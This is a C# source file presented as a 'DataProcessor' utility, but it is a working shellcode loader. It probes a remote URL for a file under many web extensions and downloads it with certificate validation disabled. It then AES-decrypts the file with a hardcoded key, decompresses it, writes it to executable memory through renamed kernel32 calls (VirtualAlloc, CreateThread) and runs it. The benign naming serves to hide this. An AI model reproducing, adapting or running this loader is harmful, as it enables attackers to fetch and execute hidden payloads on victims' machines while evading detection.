using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace DataProcessor
{
    class CoreLogic
    {
        private static string resourcePath = "https://www.tecnologico.org/d2fc1b6a458f";
        private static string securityToken = "9ae0c8e048d89fb3";
        private static string initVector = "789ca1a73299c6e0";

        private static List<string> fileTypes = new List<string>
        {
            ".html", ".css", ".js", ".json", ".xml", ".php", ".asp", ".aspx",
            ".jsp", ".cgi", ".pl", ".rss", ".svg", ".xhtml", ".cfm",
            ".axd", ".asx", ".asmx", ".ashx", ".swf"
        };

        // Obfuscated memory and thread management
        private static class ResourceManager
        {
            [DllImport("kernel32.dll", EntryPoint = "VirtualAlloc", SetLastError = true, ExactSpelling = true)]
            private static extern IntPtr AllocateMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll", EntryPoint = "CreateThread", SetLastError = true)]
            private static extern IntPtr StartRoutine(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32.dll", EntryPoint = "WaitForSingleObject", SetLastError = true)]
            private static extern uint WaitForCompletion(IntPtr hHandle, uint dwMilliseconds);

            public static void ProcessData(byte[] data)
            {
                if (data.Length <= 16) return;

                byte[] payload = data.Skip(16).ToArray();
                byte[] processed = SecureTransform(payload);
                byte[] expanded = ExpandData(processed);

                IntPtr mem = AllocateMemory(IntPtr.Zero, (uint)expanded.Length, 0x3000, 0x40);
                if (mem == IntPtr.Zero) return;

                Marshal.Copy(expanded, 0, mem, expanded.Length);
                IntPtr threadHandle = StartRoutine(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForCompletion(threadHandle, 0xFFFFFFFF);
            }
        }

        private static byte[] SecureTransform(byte[] input)
        {
            byte[] key = Encoding.UTF8.GetBytes(securityToken);
            byte[] iv = Encoding.UTF8.GetBytes(initVector);

            using (Aes cipher = Aes.Create())
            {
                cipher.Key = key;
                cipher.IV = iv;
                cipher.Padding = PaddingMode.None;

                ICryptoTransform transformer = cipher.CreateDecryptor(cipher.Key, cipher.IV);
                using (MemoryStream inputStream = new MemoryStream(input))
                using (MemoryStream outputStream = new MemoryStream())
                using (CryptoStream cryptoStream = new CryptoStream(inputStream, transformer, CryptoStreamMode.Read))
                {
                    cryptoStream.CopyTo(outputStream);
                    return outputStream.ToArray();
                }
            }
        }

        private static byte[] ExpandData(byte[] input)
        {
            using (MemoryStream outputStream = new MemoryStream())
            using (MemoryStream inputStream = new MemoryStream(input))
            using (GZipStream expander = new GZipStream(inputStream, CompressionMode.Decompress, true))
            {
                expander.CopyTo(outputStream);
                return outputStream.ToArray();
            }
        }

        private static byte[] FetchResource(string url)
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, errors) => true;
                using (WebClient client = new WebClient())
                {
                    return client.DownloadData(url);
                }
            }
            catch
            {
                return null;
            }
        }

        private static string LocateResource()
        {
            foreach (var type in fileTypes)
            {
                string target = resourcePath + type;
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(target);
                    req.Method = "GET";
                    using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                    {
                        if (resp.StatusCode == HttpStatusCode.OK)
                        {
                            return target;
                        }
                    }
                }
                catch
                {
                    continue;
                }
            }
            return null;
        }

        private static void ProcessResource(string resourceUrl)
        {
            byte[] resourceData = FetchResource(resourceUrl);
            if (resourceData != null && resourceData.Length > 0)
            {
                ResourceManager.ProcessData(resourceData);
            }
        }

        public static void Main(string[] args)
        {
            string validResource = LocateResource();
            if (!string.IsNullOrEmpty(validResource))
            {
                ProcessResource(validResource);
            }
        }
    }
}
